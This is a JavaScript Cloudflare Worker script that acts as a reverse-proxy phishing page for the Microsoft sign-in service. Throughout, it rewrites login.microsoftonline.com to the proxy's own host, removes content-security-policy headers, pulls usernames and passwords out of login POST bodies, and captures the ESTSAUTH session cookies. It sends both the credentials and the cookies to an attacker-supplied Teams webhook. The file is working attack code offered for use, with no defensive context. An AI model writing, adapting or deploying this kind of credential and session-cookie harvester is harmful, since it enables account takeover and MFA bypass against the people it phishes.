// Microsoft
const upstream = 'login.microsoftonline.com'
const upstream_path = '/'
const https = true
const webhook = "<TEAMS_WEBHOOK>"

// Blocking
const blocked_region = []
const blocked_ip_address = ['0.0.0.0', '127.0.0.1']

addEventListener('fetch', event => {
    event.respondWith(fetchAndApply(event.request));
})

async function fetchAndApply(request) {
    const region = request.headers.get('cf-ipcountry').toUpperCase();
    const ip_address = request.headers.get('cf-connecting-ip');
   
    let all_cookies = ""
    let response = null;
    let url = new URL(request.url);
    let url_hostname = url.hostname;

    if (https == true) {
        url.protocol = 'https:';
    } else {
        url.protocol = 'http:';
    }

    var upstream_domain = upstream;
    url.host = upstream_domain;

    if (url.pathname == '/') {
        url.pathname = upstream_path;
    } else {
        url.pathname = upstream_path + url.pathname;
    }

    if (blocked_region.includes(region)) {
        response = new Response('Access denied.', {
            status: 403
        });
    } else if (blocked_ip_address.includes(ip_address)) {
        response = new Response('Access denied', {
            status: 403
        });
    } else {
        let method = request.method;
        let request_headers = request.headers;
        let new_request_headers = new Headers(request_headers);

        new_request_headers.set('Host', upstream_domain);
        new_request_headers.set('Referer', url.protocol + '//' + url_hostname);

        // Obtain password from POST body
        if (request.method === 'POST') {
            const temp_req = await request.clone();
            var body = await temp_req.text()
            const keyValuePairs = body.split('&');
            var message = "<b>Password found:</b><br><br>"

            // Iterate over the key-value pairs to find the passwd key
            for (const pair of keyValuePairs) {
                const [key, value] = pair.split('=');

                if (key === 'login') {
                    	// Decode the URL-encoded value for the username
            		const username = decodeURIComponent(value.replace(/\+/g, ' '));
           		 // Return the decoded value of the login key
            		message = message + "<b>User</b>: " + username + "<br>";
                }
                if (key === 'passwd') {
			// Decode the URL-encoded value for the username
			const password = decodeURIComponent(value.replace(/\+/g, ' '));
			// Return the decoded value of the login key
			message = message + "<b>Password</b>: " + password + "<br>"
                }
            }
            if (message.includes("User") && message.includes("Password</b>")) {
                teams(message, webhook)
            }
        }

        let original_response = await fetch(url.href, {
            method: method,
            headers: new_request_headers,
            body: request.body
        })

        connection_upgrade = new_request_headers.get("Upgrade");
        if (connection_upgrade && connection_upgrade.toLowerCase() == "websocket") {
            return original_response;
        }

        let original_response_clone = original_response.clone();
        let original_text = null;
        let response_headers = original_response.headers;
        let new_response_headers = new Headers(response_headers);
        let status = original_response.status;

        new_response_headers.set('access-control-allow-origin', '*');
        new_response_headers.set('access-control-allow-credentials', true);
        new_response_headers.delete('content-security-policy');
        new_response_headers.delete('content-security-policy-report-only');
        new_response_headers.delete('clear-site-data');

        // Replace cookie domains
        try {
            // Get all the Set-Cookie headers
            const originalCookies = new_response_headers.getAll("Set-Cookie");
            all_cookies = originalCookies.join("; <br><br>")

            // Iterate through each original cookie
            originalCookies.forEach(originalCookie => {
                // Replace the value in each cookie
                const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
                
                // Set the modified Set-Cookie header individually
                new_response_headers.append("Set-Cookie", modifiedCookie);
            });
        } catch (error) {
            // Handle errors
            console.error(error);
        }        

        const content_type = new_response_headers.get('content-type');

        original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);
        
        if (
            all_cookies.includes('ESTSAUTH') &&
            all_cookies.includes('ESTSAUTHPERSISTENT')
          ) {
		    await teams("<b>Cookies found:</b><br><br>" + all_cookies, webhook);
          }

        response = new Response(original_text, {
            status,
            headers: new_response_headers
        })
    }
    return response;
}

async function replace_response_text(response, upstream_domain, host_name) {
    let text = await response.text()
    let re = new RegExp('login.microsoftonline.com', 'g')
    text = text.replace(re, host_name);
    return text;
}

async function teams(m, webhook) {
    // Replace 'YOUR_TEAMS_WEBHOOK_URL' with your actual Teams webhook URL
    const teamsWebhookUrl = webhook;
    
    // Example message payload
    const message = {
      text: m
    };
  
    try {
      const response = await fetch(teamsWebhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
      });
  
      if (!response.ok) {
        throw new Error('Failed to send message to Teams');
      }
  
      return new Response('Message sent to Teams successfully', { status: 200 });
    } catch (error) {
      return new Response(`Error: ${error.message}`, { status: 500 });
    }
  }
